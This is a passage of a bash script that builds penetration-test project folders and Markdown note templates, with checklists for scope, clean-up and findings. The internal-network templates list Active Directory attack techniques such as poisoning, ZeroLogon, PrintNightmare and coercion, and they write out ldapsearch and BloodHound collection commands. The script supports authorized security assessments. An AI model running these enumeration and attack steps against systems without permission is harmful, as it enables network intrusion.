# Optimized createdir function with reduced nesting

function createdir() {
    # Prompt for assessment type
    echo "Select the assessment type:"
    echo "1) External Network Test"
    echo "2) Internal Network Test" 
    echo "3) Web Application Test"
    echo -n "Enter your choice (1-3): "
    read assessment_type
    
    # Validate assessment type
    if [[ ! "$assessment_type" =~ ^[1-3]$ ]]; then
        echo "❌ Error: Invalid assessment type. Please enter 1, 2, or 3." >&2
        return 1
    fi
    
    # Get and validate directory name
    echo "Enter a name for the directory: "
    read NAME
    local dirname=${NAME:-newdir}
    
    if [[ ! "$dirname" =~ ^[a-zA-Z0-9_.-]+$ ]]; then
        echo "❌ Error: Invalid directory name. Use only alphanumeric characters, dots, hyphens, and underscores." >&2
        return 1
    fi
    
    # Check if directory already exists
    if [[ -d "$dirname" ]]; then
        echo "⚠️  Warning: Directory '$dirname' already exists."
        echo "Do you want to continue and potentially overwrite files? (y/N): "
        read confirmation
        if [[ ! "$confirmation" =~ ^[Yy]$ ]]; then
            echo "Operation cancelled."
            return 0
        fi
    fi
    
    # Get and validate IP addresses
    echo "Enter an IP if there is one (useful for labs): "
    read IP
    local final_ip=${IP:-""}
    
    if [[ -n "$final_ip" ]] && ! validate_ip "$final_ip"; then
        echo "❌ Error: Invalid IP address format" >&2
        return 1
    fi
    
    echo "Enter a HOST IP (e.g., a tun0 VPN IP): "
    read LHOST
    local final_lhost=${LHOST:-""}
    
    if [[ -n "$final_lhost" ]] && ! validate_ip "$final_lhost"; then
        echo "❌ Error: Invalid HOST IP address format" >&2
        return 1
    fi
    
    # Create base directory
    echo "📁 Creating directory structure..."
    if ! mkdir -p "$dirname"; then
        echo "❌ Error: Failed to create directory '$dirname'" >&2
        return 1
    fi
    
    cd "$dirname" || {
        echo "❌ Error: Failed to change to directory '$dirname'" >&2
        return 1
    }
    
    # Set assessment name
    local assessment_name
    case $assessment_type in
        1) assessment_name="External Network Test" ;;
        2) assessment_name="Internal Network Test" ;;
        3) assessment_name="Web Application Test" ;;
    esac
    
    # Create directory structure and files
    if ! _create_assessment_dirs "$assessment_type"; then
        echo "❌ Error: Failed to create directory structure" >&2
        return 1
    fi
    
    echo "📝 Creating note files..."
    local failed_files=()
    _create_assessment_files "$assessment_type" failed_files
    
    if [[ ${#failed_files[@]} -gt 0 ]]; then
        echo "⚠️  Warning: Failed to create some note files: ${failed_files[*]}" >&2
    fi
    
    # Create environment and README files
    _create_project_files "$dirname" "$assessment_name" "$final_ip" "$final_lhost" "$assessment_type"
    
    # Configure direnv if available
    _configure_direnv
    
    echo
    echo "✅ Project directory '$dirname' created successfully!"
    echo "📋 Assessment Type: $assessment_name"
    echo "📍 Current location: $(pwd)"
    echo "🌐 Target IP: ${final_ip:-"Not set"}"
    echo "🏠 Host IP: ${final_lhost:-"Not set"}"
}

# Helper function to create directories
_create_assessment_dirs() {
    local assessment_type=$1
    
    case $assessment_type in
        1) # External Network Test
            mkdir -p "01-Admin" "02-Data" "04-Retest" || return 1
            mkdir -p "03-Evidence/1-Notes/1-OSINT" || return 1
            mkdir -p "03-Evidence/1-Notes/2-Hostname Enumeration" || return 1
            mkdir -p "03-Evidence/1-Notes/3-Scans/1-Port Scans" || return 1
            mkdir -p "03-Evidence/1-Notes/3-Scans/2-Vuln Scans" || return 1
            mkdir -p "03-Evidence/1-Notes/4-Services" || return 1
            mkdir -p "03-Evidence/1-Notes/5-Web App Testing" || return 1
            mkdir -p "03-Evidence/2-Findings" || return 1
            mkdir -p "03-Evidence/3-Logging_Output" || return 1
            mkdir -p "03-Evidence/4-Misc. Files" || return 1
            mkdir -p "03-Evidence/5-Screenshots" || return 1
            ;;
        2) # Internal Network Test
            mkdir -p "01-Admin" "02-Data" "04-Retest" || return 1
            mkdir -p "03-Evidence/1-Notes/1-Unauthenticated/01-Unauth SMB" || return 1
            mkdir -p "03-Evidence/1-Notes/1-Unauthenticated/02-Unauth LDAP" || return 1
            mkdir -p "03-Evidence/1-Notes/1-Unauthenticated/03-Unauth Vulns" || return 1
            mkdir -p "03-Evidence/1-Notes/2-SMB/01-Manspider" || return 1
            mkdir -p "03-Evidence/1-Notes/3-LDAP" || return 1
            mkdir -p "03-Evidence/1-Notes/4-Poisoning" || return 1
            mkdir -p "03-Evidence/1-Notes/5-User Compromise" || return 1
            mkdir -p "03-Evidence/1-Notes/6-ADCS" || return 1
            mkdir -p "03-Evidence/1-Notes/7-Machine Compromise" || return 1
            mkdir -p "03-Evidence/1-Notes/8-MSSQL" || return 1
            mkdir -p "03-Evidence/1-Notes/9-Internal Services" || return 1
            mkdir -p "03-Evidence/1-Notes/10-Internal Web Services" || return 1
            mkdir -p "03-Evidence/2-Findings" || return 1
            mkdir -p "03-Evidence/3-Logging Output" || return 1
            mkdir -p "03-Evidence/4-Misc. Files" || return 1
            mkdir -p "03-Evidence/5-Screenshots" || return 1
            ;;
        3) # Web Application Test
            mkdir -p "01-Admin" "02-OSINT" "04-Retest" || return 1
            mkdir -p "03-Evidence/Findings" || return 1
            mkdir -p "03-Evidence/Logging output" || return 1
            mkdir -p "03-Evidence/Misc files" || return 1
            mkdir -p "03-Evidence/Notes" || return 1
            mkdir -p "03-Evidence/Screenshots" || return 1
            mkdir -p "03-Evidence/Scans/Web Scans" || return 1
            mkdir -p "03-Evidence/Scans/API Testing" || return 1
            mkdir -p "03-Evidence/Scans/Burp Output" || return 1
            mkdir -p "03-Evidence/Tools/Burp Project" || return 1
            mkdir -p "03-Evidence/Tools/Custom Scripts" || return 1
            ;;
    esac
}

# Helper function to create files based on assessment type
_create_assessment_files() {
    local assessment_type=$1
    local -n failed_files_ref=$2
    
    case $assessment_type in
        1) _create_external_files failed_files_ref ;;
        2) _create_internal_files failed_files_ref ;;
        3) _create_webapp_files failed_files_ref ;;
    esac
}

# Helper function to create project files
_create_project_files() {
    local dirname=$1 assessment_name=$2 final_ip=$3 final_lhost=$4 assessment_type=$5
    
    echo "🔧 Creating environment file..."
    {
        echo "export name='$dirname'"
        echo "export assessment_type='$assessment_name'"
        [[ -n "$final_ip" ]] && echo "export ip='$final_ip'"
        [[ -n "$final_lhost" ]] && echo "export lhost='$final_lhost'"
    } > .envrc
    
    echo "📝 Creating assessment README..."
    _create_assessment_readme "$assessment_type"
}

# Helper function to configure direnv
_configure_direnv() {
    if command -v direnv >/dev/null 2>&1; then
        if direnv allow; then
            echo "✅ Environment variables configured with direnv"
        else
            echo "⚠️  Warning: Failed to configure direnv" >&2
        fi
    else
        echo "💡 Tip: Install direnv to automatically load environment variables"
        echo "   For now, you can source the .envrc file manually: source .envrc"
    fi
}

# Function to create external network assessment files
_create_external_files() {
    local -n failed_ref=$1
    
    # Create 01-Admin files
    _create_file "01-Admin/1-Admin Information.md" "# Admin Information

## Project Details
- **Assessment Type:** External Network Test
- **Start Date:** $(date +%Y-%m-%d)
- **Target:** ${final_ip:-"TBD"}
- **Tester:** $USER

## Contacts
- **Primary Contact:** 
- **Technical Contact:** 
- **Emergency Contact:** 

## Timeline
- **Start Date:** 
- **End Date:** 
- **Report Due Date:** " failed_ref

    _create_file "01-Admin/2-Scope.md" "# Scope

## External Network Scope
- **External IP Ranges:** 
- **Domains:** 
- **Excluded Systems:** 
- **Testing Methods Approved:** 
  - [ ] Port Scanning
  - [ ] Vulnerability Scanning
  - [ ] Web Application Testing
  - [ ] Social Engineering (if applicable)

## Rules of Engagement
- **Testing Hours:** 
- **Emergency Contact:** 
- **Notification Requirements:** " failed_ref

    _create_file "01-Admin/3-Questions.md" "# Questions

## Client Questions

### Technical Questions
- [ ] What is the expected network architecture?
- [ ] Are there any maintenance windows?
- [ ] What monitoring systems are in place?

### Business Questions
- [ ] What are the critical business systems?
- [ ] What would constitute a critical finding?
- [ ] Who should be notified of critical findings?

### Scope Clarifications
- [ ] Are cloud services in scope?
- [ ] Are third-party integrations included?
- [ ] What about partner networks?" failed_ref

    _create_file "01-Admin/4-Clean-Up.md" "# Clean-Up

## Clean-Up Activities

### Files to Remove
- [ ] Uploaded tools/scripts
- [ ] Temporary files
- [ ] Test accounts created

### System Changes to Revert
- [ ] Configuration changes
- [ ] User account modifications
- [ ] Network configuration changes

### Evidence Collection
- [ ] Screenshots collected
- [ ] Logs exported
- [ ] Scan results archived" failed_ref

    _create_file "01-Admin/5-TODO.md" "# TODO

## TODO List

### Pre-Engagement
- [ ] Finalize scope
- [ ] Set up testing environment
- [ ] Prepare tools

### Testing Phase
- [ ] OSINT gathering
- [ ] Hostname enumeration
- [ ] Port scanning
- [ ] Vulnerability assessment
- [ ] Service enumeration
- [ ] Web application testing

### Post-Engagement
- [ ] Clean up
- [ ] Report writing
- [ ] Client presentation" failed_ref

    # Create 02-Data files
    _create_file "02-Data/1-Users List.md" "# Users List

## Discovered Users

| Username | Source | Email | Notes |
|----------|--------|-------|-------|
|          |        |       |       |

## User Enumeration Methods
- [ ] OSINT
- [ ] Email harvesting
- [ ] LinkedIn
- [ ] Company website
- [ ] Breach databases" failed_ref

    _create_file "02-Data/2-Listening Services.md" "# Listening Services

## Listening Services

| Host | Port | Protocol | Service | Version | Notes |
|------|------|----------|---------|---------|-------|
|      |      |          |         |         |       |

## Service Categories
### Web Services
- 

### Database Services
- 

### Remote Access
- 

### Other Services
- " failed_ref

    _create_file "02-Data/3-Count of Listening Service.md" "# Count of Listening Service

## Service Count Summary

### By Protocol
- **HTTP/HTTPS:** 0
- **SSH:** 0
- **FTP:** 0
- **SMB:** 0
- **Database:** 0
- **Email:** 0
- **DNS:** 0
- **Other:** 0

### By Risk Level
- **Critical:** 0
- **High:** 0
- **Medium:** 0
- **Low:** 0
- **Info:** 0

### Total Unique Services: 0
### Total Open Ports: 0" failed_ref

    # Create OSINT files
    _create_osint_files failed_ref
    
    # Create Hostname Enumeration files
    _create_hostname_enum_files failed_ref
    
    # Create Scan files
    _create_scan_files failed_ref
    
    # Create placeholder files for other sections
    _create_file "03-Evidence/1-Notes/4-Services/README.md" "# Service Enumeration

## Discovered Services
- 

## Enumeration Results
- " failed_ref

    _create_file "03-Evidence/1-Notes/5-Web App Testing/README.md" "# Web Application Testing

## Applications Discovered
- 

## Testing Results
- " failed_ref
}

# Helper function to create OSINT files
_create_osint_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/1-OSINT/1-Repo Searching.md" "# Repo Searching

## GitHub Repository Search

### Search Queries
- 

### Findings
- 

### Sensitive Information Found
- [ ] API Keys
- [ ] Passwords
- [ ] Configuration files
- [ ] Internal URLs" failed_ref

    _create_file "03-Evidence/1-Notes/1-OSINT/2-Google Dorking.md" "# Google Dorking

## Google Dorking Results

### Search Queries Used
- site:target.com filetype:pdf
- site:target.com inurl:admin
- site:target.com \"confidential\"

### Findings
- 

### Exposed Information
- [ ] Login pages
- [ ] Directory listings
- [ ] Error messages
- [ ] Sensitive documents" failed_ref

    _create_file "03-Evidence/1-Notes/1-OSINT/3-Username Enumeration.md" "# Username Enumeration

## Username Enumeration

### Sources
- [ ] LinkedIn
- [ ] Company website
- [ ] Social media
- [ ] Email signatures

### Discovered Usernames
- 

### Email Format
- Pattern: 
- Confidence: " failed_ref

    _create_file "03-Evidence/1-Notes/1-OSINT/4-Shodan.md" "# Shodan

## Shodan Results

### Search Queries
- 

### Exposed Services
- 

### Banners and Versions
- 

### Security Issues
- [ ] Default credentials
- [ ] Outdated versions
- [ ] Exposed databases
- [ ] Weak configurations" failed_ref

    _create_file "03-Evidence/1-Notes/1-OSINT/5-Breach Searching.md" "# Breach Searching

## Data Breach Search

### Sources Checked
- [ ] HaveIBeenPwned
- [ ] DeHashed
- [ ] BreachDirectory
- [ ] Snusbase

### Discovered Breaches
- 

### Credentials Found
- 

### Password Patterns
- " failed_ref

    _create_file "03-Evidence/1-Notes/1-OSINT/6-Exposed Buckets.md" "# Exposed Buckets

## Cloud Storage Search

### AWS S3 Buckets
- 

### Azure Blob Storage
- 

### Google Cloud Storage
- 

### Findings
- [ ] Publicly readable
- [ ] Sensitive data
- [ ] Backup files
- [ ] Configuration files" failed_ref

    _create_file "03-Evidence/1-Notes/1-OSINT/7-Email Domain Security.md" "# Email Domain Security

## Email Security Assessment

### SPF Record
- Status: 
- Record: 

### DKIM
- Status: 
- Selector: 

### DMARC
- Status: 
- Policy: 

### MX Records
- 

### Issues Identified
- [ ] Missing SPF
- [ ] Weak DMARC policy
- [ ] No DKIM
- [ ] Spoofing possible" failed_ref
}

# Helper function to create hostname enumeration files
_create_hostname_enum_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/2-Hostname Enumeration/1-Manual Searching.md" "# Manual Searching

## Manual Hostname Discovery

### Methods Used
- [ ] DNS brute force
- [ ] Certificate transparency logs
- [ ] Search engine discovery
- [ ] Wayback machine

### Discovered Hostnames
- 

### Tools Used
- " failed_ref

    _create_file "03-Evidence/1-Notes/2-Hostname Enumeration/2-Apex Domains.md" "# Apex Domains

## Apex Domain Analysis

### Primary Domain
- 

### Related Domains
- 

### Subdomain Patterns
- 

### DNS Records
- A records: 
- CNAME records: 
- MX records: 
- TXT records: " failed_ref

    _create_file "03-Evidence/1-Notes/2-Hostname Enumeration/3-Hunter.md" "# Hunter

## Hunter.io Results

### Email Patterns
- 

### Confidence Score
- 

### Discovered Emails
- 

### Sources
- 

### Additional Domains
- " failed_ref

    _create_file "03-Evidence/1-Notes/2-Hostname Enumeration/4-Final Hostnames.md" "# Final Hostnames

## Final Hostname List

### In-Scope Hostnames
- 

### Out-of-Scope
- 

### Resolved IPs
- 

### Total Count: 0

### Next Steps
- [ ] Port scanning
- [ ] Service enumeration
- [ ] Web application testing" failed_ref
}

# Helper function to create scan files
_create_scan_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/3-Scans/1-Port Scans/1-Discovery.md" "# Discovery

## Host Discovery

### Live Hosts
- 

### Discovery Methods
- [ ] Ping sweep
- [ ] TCP SYN scan
- [ ] UDP scan
- [ ] ARP scan

### Commands Used
\`\`\`bash

\`\`\`

### Results Summary
- Total hosts discovered: 0
- Response time: 
- Filtered hosts: 0" failed_ref

    _create_file "03-Evidence/1-Notes/3-Scans/1-Port Scans/2-TCP.md" "# TCP

## TCP Port Scanning

### Scan Commands
\`\`\`bash

\`\`\`

### Open Ports Summary
- 

### Service Versions
- 

### Notable Findings
- 

### Next Steps
- [ ] Service enumeration
- [ ] Vulnerability scanning
- [ ] Banner grabbing" failed_ref

    _create_file "03-Evidence/1-Notes/3-Scans/1-Port Scans/3-UDP.md" "# UDP

## UDP Port Scanning

### Scan Commands
\`\`\`bash

\`\`\`

### Open UDP Ports
- 

### Service Identification
- 

### Common UDP Services Found
- [ ] DNS (53)
- [ ] DHCP (67/68)
- [ ] SNMP (161)
- [ ] NTP (123)

### Security Implications
- " failed_ref

    _create_file "03-Evidence/1-Notes/3-Scans/2-Vuln Scans/1-Nessus.md" "# Nessus

## Nessus Vulnerability Scan

### Scan Configuration
- Policy: 
- Scan time: 
- Targets: 

### Critical Findings
- 

### High Risk Findings
- 

### Medium Risk Findings
- 

### Summary Statistics
- Critical: 0
- High: 0
- Medium: 0
- Low: 0
- Info: 0" failed_ref

    _create_file "03-Evidence/1-Notes/3-Scans/2-Vuln Scans/2-Nuclei.md" "# Nuclei

## Nuclei Vulnerability Scan

### Templates Used
- 

### Command Executed
\`\`\`bash

\`\`\`

### Findings
- 

### False Positives
- 

### Verified Vulnerabilities
- " failed_ref

    _create_file "03-Evidence/1-Notes/3-Scans/2-Vuln Scans/3-TLS.md" "# TLS

## TLS/SSL Assessment

### SSL/TLS Configuration
- 

### Supported Protocols
- [ ] TLS 1.3
- [ ] TLS 1.2
- [ ] TLS 1.1 (deprecated)
- [ ] TLS 1.0 (deprecated)
- [ ] SSL 3.0 (vulnerable)

### Cipher Suites
- Strong: 
- Weak: 

### Certificate Analysis
- Issuer: 
- Expiration: 
- Algorithm: 
- Key size: 

### Vulnerabilities
- [ ] Heartbleed
- [ ] POODLE
- [ ] BEAST
- [ ] FREAK" failed_ref
}

# Helper function to safely create files
_create_file() {
    local file_path=$1
    local content=$2
    local -n failed_ref=$3
    
    if ! echo -e "$content" > "$file_path"; then
        failed_ref+=("$file_path")
    fi
}
# Function to create internal network assessment files
_create_internal_files() {
    local -n failed_ref=$1
    
    # Create 01-Admin files
    _create_file "01-Admin/1-Admin Information.md" "# Admin Information

## Project Details
- **Assessment Type:** Internal Network Test
- **Start Date:** $(date +%Y-%m-%d)
- **Target:** ${final_ip:-"TBD"}
- **Tester:** $USER

## Contacts
- **Primary Contact:** 
- **Technical Contact:** 
- **Emergency Contact:** 

## Timeline
- **Start Date:** 
- **End Date:** 
- **Report Due Date:** " failed_ref

    _create_file "01-Admin/2-Scope.md" "# Scope

## Internal Network Scope
- **Network Ranges:** 
- **Domain:** 
- **Excluded Systems:** 
- **Testing Methods Approved:** 
  - [ ] Network Discovery
  - [ ] Service Enumeration
  - [ ] AD Enumeration
  - [ ] Credential Attacks
  - [ ] Lateral Movement
  - [ ] Privilege Escalation

## Rules of Engagement
- **Testing Hours:** 
- **Emergency Contact:** 
- **Notification Requirements:** 
- **Domain Admin Scope:** " failed_ref

    _create_file "01-Admin/3-Questions.md" "# Questions

## Client Questions

### Technical Questions
- [ ] What is the domain structure?
- [ ] Are there any monitoring solutions?
- [ ] What critical systems exist?
- [ ] Are there domain trusts?

### Business Questions
- [ ] What constitutes a critical finding?
- [ ] Who should be notified of DA compromise?
- [ ] What are the critical business hours?

### Scope Clarifications
- [ ] Are other domains in scope?
- [ ] Can we test ADCS?
- [ ] Is lateral movement allowed?" failed_ref

    _create_file "01-Admin/4-Clean-Up.md" "# Clean-Up

## Clean-Up Activities

### Files to Remove
- [ ] Uploaded tools/scripts
- [ ] Temporary files
- [ ] Test accounts created
- [ ] Malicious certificates

### System Changes to Revert
- [ ] User account modifications
- [ ] Service account changes
- [ ] ACL modifications
- [ ] Group membership changes

### Evidence Collection
- [ ] Screenshots collected
- [ ] Logs exported
- [ ] BloodHound data archived
- [ ] Credential dumps secured" failed_ref

    _create_file "01-Admin/5-TODO.md" "# TODO

## TODO List

### Pre-Engagement
- [ ] Finalize scope
- [ ] Set up testing environment
- [ ] Prepare tools (Responder, BloodHound, etc.)

### Testing Phase
- [ ] Unauthenticated enumeration
- [ ] SMB enumeration
- [ ] LDAP enumeration
- [ ] Network poisoning
- [ ] User compromise
- [ ] Machine compromise
- [ ] Domain privilege escalation

### Post-Engagement
- [ ] Clean up
- [ ] Report writing
- [ ] Client presentation" failed_ref

    _create_file "01-Admin/6-Detections.md" "# Detections

## Detection Events

### Blue Team Alerts
- [ ] Login alerts
- [ ] Lateral movement detection
- [ ] Credential dumping alerts
- [ ] Kerberoasting detection

### SOC Communications
- **Primary SOC Contact:** 
- **Alert Escalation Process:** 

### Defensive Measures Observed
- [ ] EDR solutions
- [ ] Network monitoring
- [ ] Privilege escalation detection
- [ ] Anomalous authentication alerts

### Evasion Techniques Used
- 

### Blue Team Coordination
- **Notification sent:** 
- **Testing authorized by:** 
- **Real-time communication method:** " failed_ref

    # Create 02-Data files
    _create_file "02-Data/1-Users List.md" "# Users List

## Discovered Users

| Username | Domain | Email | Source | Privileges | Notes |
|----------|--------|-------|--------|------------|-------|
|          |        |       |        |            |       |

## User Categories
### Service Accounts
- 

### Administrative Users
- 

### Standard Users
- 

## User Enumeration Methods
- [ ] LDAP enumeration
- [ ] RID cycling
- [ ] Kerberos user enumeration
- [ ] SMB share analysis" failed_ref

    _create_file "02-Data/2-Listening Services.md" "# Listening Services

## Listening Services

| Host | Port | Protocol | Service | Version | Domain | Notes |
|------|------|----------|---------|---------|--------|-------|
|      |      |          |         |         |        |       |

## Service Categories
### Domain Services
- **Domain Controllers:** 
- **LDAP:** 
- **Kerberos:** 
- **DNS:** 

### File Services
- **SMB Shares:** 
- **FTP:** 
- **NFS:** 

### Database Services
- **MSSQL:** 
- **MySQL:** 
- **Oracle:** 

### Web Services
- **IIS:** 
- **Apache:** 
- **Internal Web Apps:** " failed_ref

    _create_file "02-Data/3-Count of Listening Services.md" "# Count of Listening Services

## Service Count Summary

### By Protocol
- **SMB (445):** 0
- **LDAP (389/636):** 0
- **Kerberos (88):** 0
- **DNS (53):** 0
- **HTTP/HTTPS:** 0
- **MSSQL (1433):** 0
- **RDP (3389):** 0
- **WinRM (5985/5986):** 0
- **SSH (22):** 0

### By Risk Level
- **Critical:** 0
- **High:** 0
- **Medium:** 0
- **Low:** 0
- **Info:** 0

### Domain Controllers: 0
### Total Unique Services: 0
### Total Open Ports: 0" failed_ref

    _create_file "02-Data/4-Technology in Use.md" "# Technology in Use

## Technology Stack

### Operating Systems
- **Windows Server versions:** 
- **Workstation versions:** 
- **Linux distributions:** 

### Active Directory
- **Domain name:** 
- **Forest functional level:** 
- **Domain functional level:** 
- **Domain controllers:** 

### Security Solutions
- **Antivirus/EDR:** 
- **SIEM:** 
- **Network monitoring:** 
- **Backup solutions:** 

### Infrastructure
- **Virtualization:** 
- **Cloud services:** 
- **Network equipment:** 
- **Storage systems:** 

### Applications
- **Email system:** 
- **Database platforms:** 
- **Web applications:** 
- **Business applications:** " failed_ref

    # Create Unauthenticated files
    _create_unauthenticated_files failed_ref
    
    # Create SMB files
    _create_smb_files failed_ref
    
    # Create LDAP files
    _create_ldap_files failed_ref
    
    # Create Poisoning files
    _create_poisoning_files failed_ref
    
    # Create User Compromise files
    _create_user_compromise_files failed_ref
    
    # Create ADCS files
    _create_adcs_files failed_ref
    
    # Create Machine Compromise files
    _create_machine_compromise_files failed_ref
    
    # Create MSSQL files
    _create_mssql_files failed_ref
    
    # Create Internal Services files
    _create_internal_services_files failed_ref
    
    # Create Internal Web Services files
    _create_internal_web_services_files failed_ref
}

# Helper function to create unauthenticated files
_create_unauthenticated_files() {
    local -n failed_ref=$1
    
    # Main unauthenticated files
    _create_file "03-Evidence/1-Notes/1-Unauthenticated/1-Packet Capture.md" "# Packet Capture

## Network Traffic Analysis

### Capture Details
- **Interface:** 
- **Duration:** 
- **Filter:** 

### Protocols Observed
- [ ] LLMNR
- [ ] NetBIOS-NS
- [ ] mDNS
- [ ] DHCP
- [ ] SMB
- [ ] LDAP

### Interesting Findings
- 

### Credentials in Traffic
- " failed_ref

    _create_file "03-Evidence/1-Notes/1-Unauthenticated/2-Responder Analyze.md" "# Responder Analyze

## Responder Analysis

### Responder Configuration
- **Interface:** 
- **Protocols enabled:** 

### Captured Hashes
- 

### Poisoning Events
- 

### Analysis Results
- **Successful attacks:** 
- **Failed attempts:** 
- **Systems vulnerable:** " failed_ref

    _create_file "03-Evidence/1-Notes/1-Unauthenticated/3-Email Domain Security.md" "# Email Domain Security

## Email Security Assessment

### SPF Record
- **Status:** 
- **Record:** 

### DKIM
- **Status:** 
- **Selector:** 

### DMARC
- **Status:** 
- **Policy:** 

### Issues Identified
- [ ] Missing SPF
- [ ] Weak DMARC policy
- [ ] No DKIM
- [ ] Email spoofing possible" failed_ref

    _create_file "03-Evidence/1-Notes/1-Unauthenticated/4-Find DCs.md" "# Find DCs

## Domain Controller Discovery

### Discovery Methods
- [ ] DNS SRV records
- [ ] LDAP queries
- [ ] NetBIOS queries
- [ ] Network scanning

### Discovered DCs
- 

### DC Roles
- **PDC Emulator:** 
- **Infrastructure Master:** 
- **RID Master:** 
- **Schema Master:** 
- **Domain Naming Master:** 

### DC Analysis
- **OS versions:** 
- **Patch levels:** 
- **Exposed services:** " failed_ref

    _create_file "03-Evidence/1-Notes/1-Unauthenticated/5-Breached Credentials.md" "# Breached Credentials

## Credential Breach Analysis

### Sources Checked
- [ ] HaveIBeenPwned
- [ ] DeHashed
- [ ] BreachDirectory
- [ ] Snusbase

### Domain-related Breaches
- 

### Discovered Credentials
- 

### Password Patterns
- 

### Credential Validation
- **Valid credentials:** 
- **Invalid credentials:** 
- **Expired accounts:** " failed_ref

    _create_file "03-Evidence/1-Notes/1-Unauthenticated/6-Host Discovery.md" "# Host Discovery

## Network Host Discovery

### Discovery Methods
- [ ] ARP scanning
- [ ] Ping sweeps
- [ ] TCP SYN scanning
- [ ] UDP scanning

### Live Hosts
- **Total discovered:** 0
- **Windows hosts:** 0
- **Linux hosts:** 0
- **Network devices:** 0

### Host Categories
### Domain Controllers
- 

### Servers
- 

### Workstations
- 

### Network Infrastructure
- " failed_ref

    _create_file "03-Evidence/1-Notes/1-Unauthenticated/7-Initial NetExec.md" "# Initial NetExec

## Initial NetExec Enumeration

### Commands Executed
\`\`\`bash

\`\`\`

### Results Summary
- **Accessible hosts:** 0
- **SMB signing required:** 0
- **SMB signing not required:** 0
- **Guest access enabled:** 0

### Notable Findings
- 

### Next Steps
- [ ] Detailed SMB enumeration
- [ ] LDAP enumeration
- [ ] Service-specific testing" failed_ref

    # Unauthenticated SMB files
    _create_file "03-Evidence/1-Notes/1-Unauthenticated/01-Unauth SMB/1-ZeroLogon.md" "# ZeroLogon

## ZeroLogon (CVE-2020-1472)

### Target Assessment
- **Domain controllers tested:** 
- **Vulnerable systems:** 

### Exploitation Results
- **Successful:** 
- **Failed:** 

### Impact
- **Domain compromise possible:** 
- **Machine account reset:** 

### Remediation
- **Patches required:** 
- **Enforcement mode:** " failed_ref

    _create_file "03-Evidence/1-Notes/1-Unauthenticated/01-Unauth SMB/2-PrintNightmare.md" "# PrintNightmare

## PrintNightmare (CVE-2021-1675/34527)

### Target Assessment
- **Print servers identified:** 
- **Spooler service running:** 

### Exploitation Attempts
- **Local privilege escalation:** 
- **Remote code execution:** 

### Results
- **Successful exploits:** 
- **Failed attempts:** 

### Impact
- **System compromise:** 
- **Domain escalation path:** " failed_ref

    _create_file "03-Evidence/1-Notes/1-Unauthenticated/01-Unauth SMB/3-SMBGhost.md" "# SMBGhost

## SMBGhost (CVE-2020-0796)

### Target Assessment
- **SMBv3.1.1 systems:** 
- **Vulnerable versions:** 

### Exploitation Results
- **Successful:** 
- **Failed:** 

### Impact
- **Remote code execution:** 
- **System compromise:** 

### Remediation Status
- **Patched systems:** 
- **Unpatched systems:** " failed_ref

    _create_file "03-Evidence/1-Notes/1-Unauthenticated/01-Unauth SMB/4-Unauthenticated Coercion.md" "# Unauthenticated Coercion

## Unauthenticated Coercion Attacks

### PetitPotam
- **Vulnerable systems:** 
- **Successful coercion:** 

### DFSCoerce
- **DFS servers identified:** 
- **Coercion successful:** 

### PrinterBug
- **Print servers:** 
- **Coercion results:** 

### Impact
- **NTLM relay potential:** 
- **Certificate template abuse:** " failed_ref

    # Create placeholder README files for subdirectories
    _create_file "03-Evidence/1-Notes/1-Unauthenticated/02-Unauth LDAP/README.md" "# Unauthenticated LDAP Enumeration

## Anonymous Bind Results
- 

## Information Disclosed
- " failed_ref

    _create_file "03-Evidence/1-Notes/1-Unauthenticated/03-Unauth Vulns/README.md" "# Unauthenticated Vulnerabilities

## Vulnerability Scans
- 

## Findings
- " failed_ref
}

# Helper function to create SMB files
_create_smb_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/2-SMB/01-Manspider/README.md" "# ManSpider Results

## Interesting Files Found
- 

## Sensitive Data
- " failed_ref

    _create_file "03-Evidence/1-Notes/2-SMB/1-Unauthenticated Shares.md" "# Unauthenticated Shares

## Unauthenticated Share Access

### Discovered Shares
| Host | Share | Permissions | Contents | Notes |
|------|-------|-------------|----------|-------|
|      |       |             |          |       |

### Interesting Files
- 

### Sensitive Information
- " failed_ref

    _create_file "03-Evidence/1-Notes/2-SMB/2-Guest Access.md" "# Guest Access

## Guest Account Access

### Systems with Guest Access
- 

### Accessible Resources
- 

### Information Disclosed
- " failed_ref

    _create_file "03-Evidence/1-Notes/2-SMB/3-Spider Shares.md" "# Spider Shares

## Share Spidering Results

### Tools Used
- [ ] smbclient
- [ ] smbmap
- [ ] ManSpider
- [ ] ShareFinder

### Interesting Files Found
- 

### Credentials in Files
- " failed_ref

    _create_file "03-Evidence/1-Notes/2-SMB/4-SMB Vuln Scans.md" "# SMB Vuln Scans

## SMB Vulnerability Assessment

### Vulnerabilities Found
- 

### Exploitable Issues
- 

### Remediation Recommendations
- " failed_ref
}

# Helper function to create LDAP enumeration files
_create_ldap_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/3-LDAP/1-LDAP Enumeration.md" "# LDAP Enumeration

## LDAP Server Information
- **Server:** 
- **Port:** 389/636
- **Authentication:** 

### Anonymous Bind Results
- [ ] Enabled
- [ ] Disabled

### Base DN
- 

### Users Enumerated
- 

### Groups Enumerated
- 

### LDAP Queries Used
\`\`\`
# Basic enumeration
ldapsearch -x -h <target> -s base

# User enumeration
ldapsearch -x -h <target> -s sub -b 'DC=domain,DC=com' '(objectClass=user)'

# Group enumeration
ldapsearch -x -h <target> -s sub -b 'DC=domain,DC=com' '(objectClass=group)'
\`\`\`" failed_ref

    _create_file "03-Evidence/1-Notes/3-LDAP/2-BloodHound.md" "# BloodHound

## Data Collection
- **Collector:** 
- **Method:** 
- **Date:** 

### Collection Commands
\`\`\`bash
# SharpHound
SharpHound.exe -c All -d domain.local --zipfilename domain_bloodhound.zip

# BloodHound.py
bloodhound-python -d domain.local -u username -p password -gc dc.domain.local -c all
\`\`\`

### Attack Paths Found
- 

### Interesting Findings
- **Shortest path to DA:** 
- **Kerberoastable users:** 
- **ASREPRoastable users:** 
- **Unconstrained delegation:** 
- **Constrained delegation:** " failed_ref

    _create_file "03-Evidence/1-Notes/3-LDAP/3-Domain Info.md" "# Domain Info

## Domain Information
- **Domain Name:** 
- **NetBIOS Name:** 
- **Domain SID:** 
- **Functional Level:** 

### Domain Controllers
| Hostname | IP Address | OS Version | Roles |
|----------|------------|------------|-------|
|          |            |            |       |

### Trust Relationships
- 

### Group Policy
- **GPO Count:** 
- **Interesting GPOs:** 

### Schema Information
- **Schema Version:** 
